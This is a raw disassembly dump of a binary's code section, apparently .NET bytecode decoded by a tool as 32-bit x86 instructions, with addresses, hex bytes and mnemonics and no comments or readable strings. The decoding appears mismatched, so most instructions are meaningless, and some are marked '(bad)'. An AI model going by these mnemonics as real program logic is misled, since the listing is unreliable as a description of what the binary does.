  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 b4             	or     -0x4c(%edx),%dh
  403d47:	21 00                	and    %eax,(%eax)
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	dc 01                	faddl  (%ecx)
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 ba                	jb     0x403d7b
  403dc1:	21 00                	and    %eax,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	72 1a                	jb     0x403dec
  403dd2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403dd6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403ddb:	25 00 00 00 07       	and    $0x7000000,%eax
  403de0:	72 24                	jb     0x403e06
  403de2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403de6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403deb:	60                   	pusha
  403dec:	00 00                	add    %al,(%eax)
  403dee:	00 07                	add    %al,(%edi)
  403df0:	72 32                	jb     0x403e24
  403df2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403df6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403dfb:	d9 00                	flds   (%eax)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e02:	00 00                	add    %al,(%eax)
  403e04:	16                   	push   %ss
  403e05:	28 1a                	sub    %bl,(%edx)
  403e07:	00 00                	add    %al,(%eax)
  403e09:	06                   	push   %es
  403e0a:	73 94                	jae    0x403da0
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	06                   	push   %es
  403e0f:	25 72 ba 21 00       	and    $0x21ba72,%eax
  403e14:	70 6f                	jo     0x403e85
  403e16:	7f 00                	jg     0x403e18
  403e18:	00 06                	add    %al,(%esi)
  403e1a:	72 1a                	jb     0x403e36
  403e1c:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e20:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e26:	d2 21                	shlb   %cl,(%ecx)
  403e28:	00 70 6f             	add    %dh,0x6f(%eax)
  403e2b:	7f 00                	jg     0x403e2d
  403e2d:	00 06                	add    %al,(%esi)
  403e2f:	28 17                	sub    %dl,(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	06                   	push   %es
  403e34:	6a 6f                	push   $0x6f
  403e36:	74 00                	je     0x403e38
  403e38:	00 06                	add    %al,(%esi)
  403e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3b:	89 00                	mov    %eax,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	28 20                	sub    %ah,(%eax)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	16                   	push   %ss
  403e45:	28 18                	sub    %bl,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 06                	add    %al,(%esi)
  403e51:	72 48                	jb     0x403e9b
  403e53:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e57:	7f 00                	jg     0x403e59
  403e59:	00 06                	add    %al,(%esi)
  403e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5c:	8b 00                	mov    (%eax),%eax
  403e5e:	00 06                	add    %al,(%esi)
  403e60:	28 42 00             	sub    %al,0x0(%edx)
  403e63:	00 06                	add    %al,(%esi)
  403e65:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e69:	00 7e 24             	add    %bh,0x24(%esi)
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	04 06                	add    $0x6,%al
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e76:	94                   	xchg   %eax,%esp
  403e77:	00 00                	add    %al,(%eax)
  403e79:	06                   	push   %es
  403e7a:	25 72 ba 21 00       	and    $0x21ba72,%eax
  403e7f:	70 6f                	jo     0x403ef0
  403e81:	7f 00                	jg     0x403e83
  403e83:	00 06                	add    %al,(%esi)
  403e85:	72 50                	jb     0x403ed7
  403e87:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e8b:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e91:	66 26 00 70 6f       	data16 add %dh,%es:0x6f(%eax)
  403e96:	7f 00                	jg     0x403e98
  403e98:	00 06                	add    %al,(%esi)
  403e9a:	06                   	push   %es
  403e9b:	72 48                	jb     0x403ee5
  403e9d:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403ea1:	7f 00                	jg     0x403ea3
  403ea3:	00 06                	add    %al,(%esi)
  403ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea6:	8b 00                	mov    (%eax),%eax
  403ea8:	00 06                	add    %al,(%esi)
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	06                   	push   %es
  403eb4:	28 20                	sub    %ah,(%eax)
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	06                   	push   %es
  403eb9:	38 06                	cmp    %al,(%esi)
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	00 06                	add    %al,(%esi)
  403ebf:	28 47 00             	sub    %al,0x0(%edi)
  403ec2:	00 06                	add    %al,(%esi)
  403ec4:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403eca:	b3 00                	mov    $0x0,%bl
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403ed9:	72 74                	jb     0x403f4f
  403edb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403edf:	7f 00                	jg     0x403ee1
  403ee1:	00 06                	add    %al,(%esi)
  403ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee4:	8b 00                	mov    (%eax),%eax
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	06                   	push   %es
  403ee9:	72 48                	jb     0x403f33
  403eeb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403eef:	7f 00                	jg     0x403ef1
  403ef1:	00 06                	add    %al,(%esi)
  403ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef4:	7a 00                	jp     0x403ef6
  403ef6:	00 06                	add    %al,(%esi)
  403ef8:	28 41 00             	sub    %al,0x0(%ecx)
  403efb:	00 06                	add    %al,(%esi)
  403efd:	26 7e 24             	es jle 0x403f24
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 28                	add    $0x28,%al
  403f04:	01 00                	add    %eax,(%eax)
  403f06:	00 2b                	add    %ch,(%ebx)
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f0e:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f12:	00 12                	add    %dl,(%edx)
  403f14:	02 28                	add    (%eax),%ch
  403f16:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f1b:	09 72 48             	or     %esi,0x48(%edx)
  403f1e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f22:	7f 00                	jg     0x403f24
  403f24:	00 06                	add    %al,(%esi)
  403f26:	6f                   	outsl  %ds:(%esi),(%dx)
  403f27:	8b 00                	mov    (%eax),%eax
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	06                   	push   %es
  403f2c:	72 74                	jb     0x403fa2
  403f2e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f32:	7f 00                	jg     0x403f34
  403f34:	00 06                	add    %al,(%esi)
  403f36:	6f                   	outsl  %ds:(%esi),(%dx)
  403f37:	8b 00                	mov    (%eax),%eax
  403f39:	00 06                	add    %al,(%esi)
  403f3b:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f41:	12 00                	adc    (%eax),%al
  403f43:	00 00                	add    %al,(%eax)
  403f45:	09 28                	or     %ebp,(%eax)
  403f47:	47                   	inc    %edi
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	06                   	push   %es
  403f4b:	7e 24                	jle    0x403f71
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 09                	add    $0x9,%al
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f57:	12 02                	adc    (%edx),%al
  403f59:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f5f:	b3 dd                	mov    $0xdd,%bl
  403f61:	0e                   	push   %cs
  403f62:	00 00                	add    %al,(%eax)
  403f64:	00 12                	add    %dl,(%edx)
  403f66:	02 fe                	add    %dh,%bh
  403f68:	16                   	push   %ss
  403f69:	04 00                	add    $0x0,%al
  403f6b:	00 1b                	add    %bl,(%ebx)
  403f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6e:	33 00                	xor    (%eax),%eax
  403f70:	00 0a                	add    %cl,(%edx)
  403f72:	dc dd                	(bad)
  403f74:	0f 00 00             	sldt   (%eax)
  403f77:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f7a:	00 00                	add    %al,(%eax)
  403f7c:	0a 28                	or     (%eax),%ch
  403f7e:	49                   	dec    %ecx
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	06                   	push   %es
  403f82:	dd 00                	fldl   (%eax)
  403f84:	00 00                	add    %al,(%eax)
  403f86:	00 2a                	add    %ch,(%edx)
  403f88:	41                   	inc    %ecx
  403f89:	4c                   	dec    %esp
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 00                	add    %al,(%eax)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 79 00             	add    %bh,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 31                	add    %dh,(%ecx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	01 02                	add    %eax,(%edx)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	00 62 01             	add    %ah,0x1(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	57                   	push   %edi
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 cc                	add    %cl,%ah
  403fc5:	01 00                	add    %eax,(%eax)
  403fc7:	00 cc                	add    %cl,%ah
  403fc9:	01 00                	add    %eax,(%eax)
  403fcb:	00 0f                	add    %cl,(%edi)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 00                	add    %al,(%eax)
  403fd3:	01 13                	add    %edx,(%ebx)
  403fd5:	30 0b                	xor    %cl,(%ebx)
  403fd7:	00 11                	add    %dl,(%ecx)
  403fd9:	01 00                	add    %eax,(%eax)
  403fdb:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fde:	00 11                	add    %dl,(%ecx)
  403fe0:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fe6:	72 48                	jb     0x404030
  403fe8:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403fec:	7f 00                	jg     0x403fee
  403fee:	00 06                	add    %al,(%esi)
  403ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff1:	8b 00                	mov    (%eax),%eax
  403ff3:	00 06                	add    %al,(%esi)
  403ff5:	28 42 00             	sub    %al,0x0(%edx)
  403ff8:	00 06                	add    %al,(%esi)
  403ffa:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404000:	c0 00 00             	rolb   $0x0,(%eax)
  404003:	0a 72 7e             	or     0x7e(%edx),%dh
  404006:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40400a:	c1 00 00             	roll   $0x0,(%eax)
  40400d:	0a 28                	or     (%eax),%ch
  40400f:	c2 00 00             	ret    $0x0
  404012:	0a 0a                	or     (%edx),%cl
  404014:	7e 25                	jle    0x40403b
  404016:	00 00                	add    %al,(%eax)
  404018:	04 3a                	add    $0x3a,%al
  40401a:	85 00                	test   %eax,(%eax)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	20 00                	and    %al,(%eax)
  404020:	01 00                	add    %eax,(%eax)
  404022:	00 72 9a             	add    %dh,-0x66(%edx)
  404025:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  404029:	d0 0f                	rorb   $1,(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	02 28                	add    (%eax),%ch
  40402f:	c3                   	ret
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 1f                	or     (%edi),%bl
  404034:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  40403a:	25 16 16 14 28       	and    $0x28141616,%eax
  40403f:	c4 00                	les    (%eax),%eax
  404041:	00 0a                	add    %cl,(%edx)
  404043:	a2 25 17 17 14       	mov    %al,0x14171725
  404048:	28 c4                	sub    %al,%ah
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  404052:	28 c4                	sub    %al,%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  40405c:	28 c4                	sub    %al,%ah
  40405e:	00 00                	add    %al,(%eax)
  404060:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  404066:	28 c4                	sub    %al,%ah
  404068:	00 00                	add    %al,(%eax)
  40406a:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404070:	28 c4                	sub    %al,%ah
  404072:	00 00                	add    %al,(%eax)
  404074:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  40407a:	28 c4                	sub    %al,%ah
  40407c:	00 00                	add    %al,(%eax)
  40407e:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  404084:	28 c4                	sub    %al,%ah
  404086:	00 00                	add    %al,(%eax)
  404088:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  40408e:	28 c4                	sub    %al,%ah
  404090:	00 00                	add    %al,(%eax)
  404092:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  404098:	0a 28                	or     (%eax),%ch
  40409a:	c6 00 00             	movb   $0x0,(%eax)
  40409d:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040a3:	7e 25                	jle    0x4040ca
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 7b                	add    $0x7b,%al
  4040a9:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	04 06                	add    $0x6,%al
  4040b3:	28 06                	sub    %al,(%esi)
  4040b5:	00 00                	add    %al,(%eax)
  4040b7:	06                   	push   %es
  4040b8:	7e 0b                	jle    0x4040c5
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 7e                	add    $0x7e,%al
  4040be:	10 00                	adc    %al,(%eax)
  4040c0:	00 04 02             	add    %al,(%edx,%eax,1)
  4040c3:	72 a2                	jb     0x404067
  4040c5:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4040c9:	7f 00                	jg     0x4040cb
  4040cb:	00 06                	add    %al,(%esi)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	7a 00                	jp     0x4040d0
  4040d0:	00 06                	add    %al,(%esi)
  4040d2:	7e 1e                	jle    0x4040f2
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	04 7e                	add    $0x7e,%al
  4040d8:	08 00                	or     %al,(%eax)
  4040da:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040dd:	0f 00 00             	sldt   (%eax)
  4040e0:	04 7e                	add    $0x7e,%al
  4040e2:	04 00                	add    $0x0,%al
  4040e4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040e7:	c8 00 00 0a          	enter  $0x0,$0xa
  4040eb:	28 48 00             	sub    %cl,0x0(%eax)
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	2a 00                	sub    (%eax),%al
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	1b 30                	sbb    (%eax),%esi
  4040f6:	03 00                	add    (%eax),%eax
  4040f8:	5c                   	pop    %esp
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 15 00 00 11 02    	add    %dl,0x2110000
  404101:	28 18                	sub    %bl,(%eax)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 03                	or     (%ebx),%al
  404107:	28 ca                	sub    %cl,%dl
  404109:	00 00                	add    %al,(%eax)
  40410b:	0a 39                	or     (%ecx),%bh
  40410d:	0b 00                	or     (%eax),%eax
  40410f:	00 00                	add    %al,(%eax)
  404111:	72 d0                	jb     0x4040e3
  404113:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404117:	cb                   	lret
  404118:	00 00                	add    %al,(%eax)
  40411a:	0a 7a 03             	or     0x3(%edx),%bh
  40411d:	7e 2c                	jle    0x40414b
  40411f:	00 00                	add    %al,(%eax)
  404121:	04 20                	add    $0x20,%al
  404123:	50                   	push   %eax
  404124:	c3                   	ret
  404125:	00 00                	add    %al,(%eax)
  404127:	73 cc                	jae    0x4040f5
  404129:	00 00                	add    %al,(%eax)
  40412b:	0a 0a                	or     (%edx),%cl
  40412d:	02 06                	add    (%esi),%al
  40412f:	1f                   	pop    %ds
  404130:	20 6f cd             	and    %ch,-0x33(%edi)
  404133:	00 00                	add    %al,(%eax)
  404135:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404138:	00 00                	add    %al,(%eax)
  40413a:	04 02                	add    $0x2,%al
  40413c:	06                   	push   %es
  40413d:	1f                   	pop    %ds
  40413e:	40                   	inc    %eax
  40413f:	6f                   	outsl  %ds:(%esi),(%dx)
  404140:	cd 00                	int    $0x0
  404142:	00 0a                	add    %cl,(%edx)
  404144:	7d 2b                	jge    0x404171
  404146:	00 00                	add    %al,(%eax)
  404148:	04 dd                	add    $0xdd,%al
  40414a:	0d 00 00 00 06       	or     $0x6000000,%eax
  40414f:	39 06                	cmp    %eax,(%esi)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 06                	add    %al,(%esi)
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	33 00                	xor    (%eax),%eax
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	dc 2a                	fsubrl (%edx)
  40415c:	01 10                	add    %edx,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  404167:	0d 00 00 00 00       	or     $0x0,%eax
  40416c:	1b 30                	sbb    (%eax),%esi
  40416e:	05 00 15 01 00       	add    $0x11500,%eax
  404173:	00 16                	add    %dl,(%esi)
  404175:	00 00                	add    %al,(%eax)
  404177:	11 03                	adc    %eax,(%ebx)
  404179:	3a 0b                	cmp    (%ebx),%cl
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 72 18             	add    %dh,0x18(%edx)
  404180:	27                   	daa
  404181:	00 70 73             	add    %dh,0x73(%eax)
  404184:	cf                   	iret
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 7a 73             	or     0x73(%edx),%bh
  40418a:	d0 00                	rolb   $1,(%eax)
  40418c:	00 0a                	add    %cl,(%edx)
  40418e:	0a 06                	or     (%esi),%al
  404190:	1f                   	pop    %ds
  404191:	20 6a 6f             	and    %ch,0x6f(%edx)
  404194:	4e                   	dec    %esi
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40419a:	00 00                	add    %al,(%eax)
  40419c:	0a 0b                	or     (%ebx),%cl
